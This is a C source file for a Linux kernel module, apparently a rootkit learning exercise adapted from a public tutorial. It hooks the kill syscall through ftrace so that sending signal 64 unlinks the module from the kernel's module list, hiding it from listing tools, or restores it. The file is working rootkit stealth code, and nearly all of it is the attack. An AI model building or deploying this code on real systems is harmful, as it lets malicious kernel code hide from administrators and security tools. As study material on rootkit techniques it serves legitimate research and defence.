/**
 * Playing with intern module linked list to hide a loaded module.
 * 
 * Sources : 
 * https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.0_hiding_lkm/rootkit.c
 * 
 * @author Yekuuun
 */

#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "../lib/hook/ftrace_helper.h";

#define MODNAME "HIDE_LKM"

MODULE_AUTHOR("Yekuuun");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Playing with intern module list to hide a loaded module.");
MODULE_VERSION("0.0.1");

/**
 * GLOBAL.
 */
static short hidden = 0;
static struct list_head *prev;

static DEFINE_SPINLOCK(hide_lock);

static void add_module(void){
    if(!prev)
        return;

    list_add(&THIS_MODULE->list, prev);
    hidden = 0;

    pr_info("[*] Successfully module add to module list.\n");
}

static void hide_module(void) {
    prev = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);
    hidden = 1;

    pr_info("[*] Successfully module hidden.\n");
}

#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long(*orig_kill)(const struct pt_regs *regs);

static asmlinkage int hook_kill(const struct pt_regs *regs){

    pr_info("[*] Hook intercepted.\n");

    int pid = regs->di;
    int sig = regs->si;

    if(sig == 64){
        spin_lock(&hide_lock);

        if (hidden == 0)
            hide_module();
        else
            add_module();

        spin_unlock(&hide_lock);
    }

    return orig_kill(regs);
}


#else

static asmlinkage long(*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig){

    pr_info("[*] Hook intercepted.\n");

    if(sig == 64){
        spin_lock(&hide_lock);

        if (hidden == 0)
            hide_module();
        else
            add_module();

        spin_unlock(&hide_lock);
    }

    return orig_kill(pid, sig);
}

#endif


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill)
};

static int __init hide_lkm_init(void){
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("[%s] Failed to install hooks: %d\n", MODNAME, err);
        return err;
    }

    pr_info("[%s] Module loaded, hooks installed.\n", MODNAME);
    return 0;
}

static void __exit hide_lkm_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[%s] Module unloaded, hooks removed.\n", MODNAME);
}

module_init(hide_lkm_init);
module_exit(hide_lkm_exit);